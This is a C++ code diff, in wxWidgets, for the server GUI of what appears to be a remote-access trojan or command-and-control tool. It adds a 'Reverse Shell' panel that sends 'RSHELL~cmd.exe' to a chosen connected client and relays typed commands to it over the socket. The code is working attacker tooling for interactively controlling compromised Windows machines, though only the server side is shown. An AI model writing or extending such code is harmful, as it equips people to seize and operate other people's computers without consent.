@@ -163,6 +163,10 @@ void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
         if (wStr == "Testing") {
             this->p_Notebook->AddPage(new panelTest(this), wStr, true);
         }
+
+        if (wStr == "Reverse Shell") {
+            this->p_Notebook->AddPage(new panelReverseShell(this), wStr, true);
+        }
         //this->p_Notebook->AddPage(new wxTextCtrl(this->p_Notebook, wxID_ANY, wStr, wxDefaultPosition, wxDefaultSize, wxNO_BORDER), wStr, true);
         
         this->p_Notebook->Thaw();
@@ -175,4 +179,86 @@ panelTest::panelTest(wxWindow* pParent) :
     wxPanel(pParent, EnumIDS::ID_Panel_Test) {
     wxButton* btn_Test = new wxButton(this, EnumIDS::ID_FrameClienteTest, "EXEC");
     this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
+}
+
+panelReverseShell::panelReverseShell(wxWindow* pParent) :
+    wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
+    wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
+    if (wxTree) {
+        wxPanel* panel_cliente = (wxPanel*)wxTree->GetParent();
+        if (panel_cliente) {
+            FrameCliente* frame_cliente = (FrameCliente*)panel_cliente->GetParent();
+            if (frame_cliente) {
+                this->strID = frame_cliente->strClienteID;
+            }
+        }
+    }
+    this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxSize(600-5, 410), wxTE_MULTILINE);
+    this->txtConsole->SetForegroundColour(*wxWHITE);
+    this->txtConsole->SetBackgroundColour(*wxBLACK);
+
+    Bind(wxEVT_TEXT, &panelReverseShell::OnText, this);
+    Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
+
+    //Enviar comando al cliente para que ejecute
+    std::vector<struct Cliente> vc_Copy;
+    std::unique_lock<std::mutex> lock(vector_mutex);
+
+    vc_Copy = p_Servidor->vc_Clientes;
+    lock.unlock();
+
+    for (auto aClient : vc_Copy) {
+        if (aClient._id == this->strID) {
+            std::string strComando = "RSHELL~cmd.exe";
+            int ib = p_Servidor->cSend(aClient._sckCliente, strComando.c_str(), strComando.size(), 0, false);
+            std::cout << "SENT " << ib << "\n";
+            break;
+        }
+    }
+}
+
+void panelReverseShell::OnText(wxCommandEvent& event) {
+    //wxTextCtrl* win = (wxTextCtrl*)event.GetEventObject();
+    //std::cout << "CURRENT: " << win->GetInsertionPoint() << " - LAST: " << win->GetLastPosition() << " - SAVE: " <<this->p_uliUltimo <<std::endl;
+}
+
+void panelReverseShell::OnHook(wxKeyEvent& event) {
+    //long last_position = this->txtConsole->GetLastPosition();
+    long current_pos = this->txtConsole->GetInsertionPoint();
+    int iCode = event.GetKeyCode();
+    if (iCode == WXK_LEFT || iCode == WXK_BACK) {
+        //Si retrocedio hasta el ultimo regresarlo
+        if (current_pos <= this->p_uliUltimo) {
+            this->txtConsole->SetInsertionPoint(this->p_uliUltimo);
+        }else {
+            event.Skip();
+        }
+    }else if (iCode == WXK_UP) {
+        //Historial de comandos?
+    }else if (iCode == WXK_RETURN) {
+        wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
+        int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
+        wxString str1 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
+        str1.append(1, '\r');
+        str1.append(1, '\n');
+        std::vector<struct Cliente> vc_Copy;
+        std::unique_lock<std::mutex> lock(vector_mutex);
+
+        vc_Copy = p_Servidor->vc_Clientes;
+        lock.unlock();
+
+        for (auto vcCli : vc_Copy) {
+            if (vcCli._id == this->strID) {
+                int iEnviado = p_Servidor->cSend(vcCli._sckCliente, str1.c_str(), str1.size(), 0, false);
+                break;
+            }
+        }
+        
+        this->p_uliUltimo = this->txtConsole->GetLastPosition() + 2;
+        //std::cout << "Ultima posicion ahora es " << this->p_uliUltimo<< std::endl;
+          
+          event.Skip();
+    } else {
+        event.Skip();
+    }
 }
